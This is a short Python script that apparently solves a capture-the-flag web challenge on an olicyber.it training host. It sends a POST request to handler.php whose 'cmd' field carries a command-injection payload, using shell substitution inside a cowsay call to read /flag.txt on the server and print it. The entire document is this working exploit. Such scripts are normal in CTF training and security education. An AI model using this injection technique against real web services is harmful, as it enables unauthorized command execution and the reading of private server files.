import requests

data = {
    "cmd" : "cowsay \"$(cat /flag.txt)\""
}

r = requests.post("http://timp.challs.olicyber.it/handler.php", data=data)

print(r.text)